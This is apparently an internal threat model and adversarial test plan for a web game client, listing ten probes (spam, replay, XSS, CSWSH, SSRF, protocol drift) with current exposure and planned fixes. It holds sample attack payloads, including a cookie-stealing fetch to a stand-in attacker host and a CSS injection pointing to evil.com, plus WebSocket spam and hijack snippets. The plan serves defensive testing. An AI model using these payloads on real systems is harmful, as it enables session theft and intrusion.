# Player Threat Model — ANVIL-CLIENT-HOOLIGAN-003
**Filed by:** Anvil (transcription — Thunder's analysis, 2026-02-25)
**Status:** AUTHORITATIVE — player/cheater adversarial test plan
**Depends on:** HOOLIGAN-001 (violation inventory), HOOLIGAN-002 (authority collapse framing)

---

## Player Threat Model

A "player attacker" has:
- Full control of their browser (DevTools, extensions, scripts, multi-tab, automation)
- Ability to generate arbitrary UI events (spam clicks, out-of-sequence clicks)
- Ability to send crafted WS messages if any client bridge/debug handle exists
  (`window.__ws` is confirmed exposed — see HOOLIGAN-001 VIOLATION attack surface A)
- Ability to supply text/URLs via any player-controlled field
- Ability to observe DOM + WS frames (slip IDs, pending states, formulas)

They do **not** need RCE. They need a wedge.

---

## Current Stack Exposure (Pre-Fix)

Before running any probe: three confirmed structural conditions make the player
attack surface **wider than spec**:

- `window.__ws` is globally exposed — player can inject any msg_type from console
- No rate limiting on `send()` — every probe below is unthrottled
- No capability tokens — every verb fires without server-issued permission

These are not probe findings. They are preconditions that make every probe below
**easier to exploit** than it should be.

---

## Attack Suite

### PROBE-P001 — Spam the Action Plane (DoS + State Corruption)

**Goal:** Overload play loop and/or force inconsistent state.

**Method:**
- Spam-click any declare UI (ability checks) 100–1000x
- Multi-tab: open 3 tabs as same player, spam in parallel
- Console loop generating clicks at 20–60 Hz
- Via `window.__ws`: `for(let i=0;i<1000;i++) window.__ws.send({msg_type:'ability_check_declare',ability:'str'})`

**Expected server behavior:**
- Rate limit per connection + per actor + per msg_type
- Dedupe / idempotency for repeated same intent
- Hard reject if no active pending/capability
- Server stays responsive; logs show drops, not queue growth

**Current exposure:** CRITICAL — `window.__ws` exposed, no rate limit, no capability gate.
Sheet click fires `ability_check_declare` with zero game state validation (HOOLIGAN-001
VIOLATION-007 analog). 1000 declares cost nothing to send.

---

### PROBE-P002 — Send Verbs Without Permission (Capability Bypass)

**Goal:** Act when not your turn / not requested.

**Method:**
- Try every actionable UI element when no pending roll exists
- Via `window.__ws`: send action messages directly without a pending_id
- Enumerate every msg_type the client sends; fire them all cold

**Client msg_types confirmed in source:**
- `player_utterance` (main.js — after fix)
- `ability_check_declare` (sheet.js)
- `roll_confirm` (slip.js)
- `TOKEN_MOVE_INTENT` (map.js)

**Expected:**
- Server rejects everything not bound to server-issued one-shot capability
  (cap_id / pending_id), bound to: connection + actor + TTL + one-time use

**Current exposure:** CRITICAL — no capability tokens anywhere in client source.
Every verb fires freely. `roll_confirm` accepts any ID string from DOM.

---

### PROBE-P003 — Replay / Resend Old Messages (Anti-Replay)

**Goal:** Reapply prior actions for advantage (rerolls, double-spend confirmations).

**Method:**
- Capture a legitimate pending → confirm sequence via DevTools WS inspector
- Re-send the `roll_confirm` message after it's already been consumed
- Re-send after reconnect (new WS connection, same pending ID)
- Clone a pending slip element in DOM, click clone — does engine accept two confirms?

**Expected:**
- Monotonic sequence numbers per connection and/or per pending token
- One-shot tokens burn after use
- Server treats duplicates as no-ops or hard rejects

**Current exposure:** HIGH — slip.js confirms on DOM click with no client-side
one-shot guard. Server-side idempotency unverified. Pending IDs are `d.id || ('slip-' + Date.now())` — predictable if server does not generate them.

---

### PROBE-P004 — Race Conditions (Confirm/Cancel + Disconnect Timing)

**Goal:** Confuse the state machine.

**Method:**
- Click confirm and cancel in rapid succession (or two tabs doing opposite)
- Confirm, then immediately kill socket (toggle offline / hard refresh)
- Reconnect and attempt to confirm again with same pending ID
- Two-tab race: tab A confirms, tab B cancels same pending simultaneously

**Expected:**
- Server is authoritative; resolves races deterministically
- Pending rolls expire on disconnect; reconnect does not resurrect old pendings
- Outcomes stable and replayable

**Current exposure:** MEDIUM (unconfirmed) — WS reconnect logic confirmed in ws.js.
Whether pending state survives reconnect on server side is unverified. Given the
port mismatch that survived this long, session state assumptions are suspect.

---

### PROBE-P005 — Peek Before Commit (Roll Slip Oracle)

**Goal:** Learn outcome before choosing to commit.

**Method:**
- Inspect DOM for slip IDs / pending IDs (`data-slip-id` attribute — readable by any script)
- Watch WS frames in DevTools Network panel for `roll_result` messages
- Check whether `roll_result` arrives before or after player commit action
- Attempt: observe result, decide not to confirm, wait for pending to expire, re-request roll

**Expected:**
- Server does NOT compute/send result until player commits (or auto-commits on pending issuance)
- No result exists client-side prior to commitment
- Pending IDs are not secret but must not enable pre-knowledge

**Current exposure:** HIGH — slip.js stores pending IDs in DOM (`data-slip-id`).
`roll_result` handler in slip.js processes result and appends it to the slip element
before archiving. Whether the server sends result before or after commit is
unverified — if server sends result on `pending_roll` rather than on `roll_confirm`,
the oracle is open.

---

### PROBE-P006 — Role Confusion: DM-Only Data Leakage

**Goal:** Get hidden info (DCs, monster HP, unrevealed map layers, DM controls).

**Method:**
- Join as player, open DevTools WS inspector
- Monitor every inbound message for: hidden DC fields, monster full stat blocks,
  unrevealed scene assets, `director`/`dm_panel` event types
- Attempt to send DM-only msg_types from player client via `window.__ws`
- Check whether DM portrait URLs contain navigable paths to other DM assets

**Expected:**
- Server never sends DM-only fields to player connections
- Server rejects DM-only msg_types regardless of client UI
- Separate auth tokens / channels for DM vs players

**Current exposure:** UNKNOWN — unverified. However: `bestiary_entry` events are
broadcast to notebook.js (HOOLIGAN-001 VIOLATION-002). If monster stat blocks
are sent before the DM "reveals" them, that data is already in the player's DOM.
DM/player channel separation is flagged as probably porous (HOOLIGAN-002 FAILURE-D).

---

### PROBE-P007 — Content Injection via Player-Controlled Fields (Stored + Reflected XSS)

**Goal:** Execute code or break rendering.

**Method:**
Put hostile strings into every player-controlled field:
- Character name → surfaces in sheet.js render (innerHTML confirmed in sheet header)
- Chat/utterances → surfaces anywhere narration/DM response is rendered
- Notebook entries → if persistence exists, stored XSS survives reload
- Any bestiary suggestion or custom content channel

**Payloads to test:**
```
<img src=x onerror=alert(document.cookie)>
<script>window.__ws.send({msg_type:'ability_check_declare',ability:'str'})</script>
javascript:alert(1)
"><svg/onload=fetch('http://attacker/?d='+document.cookie)>
```

**Expected:**
- Client renders via `textContent` only, never `innerHTML`
- Server validates length + allowed charset
- Persistence layer stores as text or sanitized markdown (strict allowlist)

**Current exposure:** CRITICAL — `notebook.js` line 77 confirmed `innerHTML` sink
for `d.name` from WS (HOOLIGAN-001 VIOLATION-001 area). `sheet.js` line 30-31
uses `innerHTML` for `state.name` and `state.class`. `orb.js` line 43 appends
`data.text` via `textContent` (safe). `dm-panel.js` uses `textContent` (safe).
`map.js` uses `textContent` for token labels (safe). **Two confirmed innerHTML
sinks for server-controlled data.**

innerHTML sinks confirmed:
- `notebook.js:77` — `d.name` from `bestiary_entry`
- `sheet.js:30` — `state.name` from `character_state`
- `sheet.js:31` — `state.class` from `character_state`

---

### PROBE-P008 — Asset Abuse (Resource Loading as a Weapon)

**Goal:** Force client fetches, degrade performance, probe internal network.

**Method:**
Supply URLs that are:
- Extremely large images (10GB+ redirect)
- Slow endpoints / endless redirects
- `data:` URIs, `file://` URIs, `javascript:` URIs
- Internal addresses: `http://192.168.1.1/admin`, `http://localhost:8000/admin`
- DNS rebinding targets

Via: `speaking_start` → `portrait_url` field (confirmed sink in orb.js, dm-panel.js)
Via: `scene_set` → `image_url` field (confirmed sink in map.js)

**Expected:**
- Client only loads content-addressed assets
- No arbitrary URL fetch from WS data
- Size limits and MIME checks enforced server-side

**Current exposure:** HIGH — three confirmed arbitrary URL fetch sinks:
- `orb.js:38` — `data.portrait_url` → `style.backgroundImage`
- `dm-panel.js:25` — `data.portrait_url` → `style.backgroundImage`
- `map.js` — `d.image_url` → `img.src`

CSS url() injection: `portrait_url: "x) no-repeat; background:url(http://evil.com/track.png"` breaks out of CSS string.

---

### PROBE-P009 — CSWSH: Cross-Site WebSocket Hijacking

**Goal:** Drive-by manipulation from any website.

**Method:**
From a separate origin (simple local HTML page), attempt to open WS connection
to engine endpoint:
```javascript
var ws = new WebSocket('ws://localhost:8000/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({msg_type: 'ability_check_declare', ability: 'str'}));
};
```

**Expected:**
- Server enforces `Origin` allowlist on WS upgrade
- Server requires auth token; rejects unauthenticated WS
- Localhost not treated as trusted

**Current exposure:** UNKNOWN — no auth handling visible in client source.
Server-side Origin validation unverified. Given the port mismatch surviving this
long, Origin validation is suspect. This probe requires server-side code inspection
(`aidm/server/app.py` WS upgrade handler).

---

### PROBE-P010 — Client Desync / Protocol Drift Exploitation

**Goal:** Use mismatched client/server assumptions to bypass checks.

**Method:**
- Send unknown/extra fields: `{msg_type: 'ability_check_declare', ability: 'str', admin: true}`
- Send unknown msg_types: `{msg_type: 'dm_command', text: 'reveal all'}` from player client
- Alter msg_type names by one character and observe behavior
- Send messages with missing required fields

**Expected:**
- Protocol version negotiation on connect
- Unknown msg_types: hard reject with logging
- Unknown fields: rejected or safely ignored (schema validation)
- Missing fields: safe default or reject — never undefined behavior

**Current exposure:** HIGH — no version negotiation visible in client. No schema
validation in ws.js `send()` path. `player_input` vs `player_utterance` mismatch
survived undetected (HOOLIGAN-001 VIOLATION-003) — confirms protocol drift is
current state, not theoretical.

---

## Instrumentation Required

To make this measurable rather than vibes:

| Metric | Purpose |
|---|---|
| Per-connection msg/sec by msg_type | Rate limit verification |
| Drop / reject counts | Confirm server is gating, not queuing |
| Pending/capability lifecycle logs (mint → use → burn/expire) | Anti-replay verification |
| Role/auth failures (player tried DM msg_type) | Channel separation |
| Payload size rejects | DoS surface |
| Unknown msg_type alarms | Protocol drift detection |
| Queue depth / event loop latency | DoS impact measurement |

---

## Player Win Conditions

A player attacker wins if they achieve **any** of:

| Win Condition | Current Status |
|---|---|
| Act without server-issued capability | OPEN — no capability tokens |
| Learn roll outcome before committing | LIKELY OPEN — oracle unverified |
| Force reroll/duplicate via replay | LIKELY OPEN — no one-shot tokens |
| Access DM-only state | UNKNOWN — channel sep unverified |
| Lag server/client via UI spam | OPEN — no rate limiting |
| Execute/persist code via content | OPEN — innerHTML sinks confirmed |
| Connect to WS from unrelated origin | UNKNOWN — Origin check unverified |

**Current score: 4 confirmed open, 2 likely open, 2 unknown.**
No win condition is confirmed blocked.

---

## Mapping to Required WOs

| Probe | Blocks Win Condition | WO |
|---|---|---|
| P001, P002 | Act without capability / lag server | WO-SEC-CAPABILITY-001 |
| P003, P004 | Replay / race conditions | WO-SEC-CAPABILITY-001 |
| P005 | Roll oracle | WO-SEC-CAPABILITY-001 + engine roll commit design |
| P006 | DM data leakage | WO-SEC-DMSEP-001 |
| P007 | XSS / stored injection | WO-SEC-TAINT-001 |
| P008 | Asset abuse | WO-SEC-RESOURCE-001 |
| P009 | CSWSH | WO-SEC-WS-CONTRACT-001 |
| P010 | Protocol drift | WO-SEC-WS-CONTRACT-001 |

---

*Filed from Thunder's analysis. Player hat on. No win condition is currently blocked.*
*The front door is the vulnerability. It was designed to listen.*
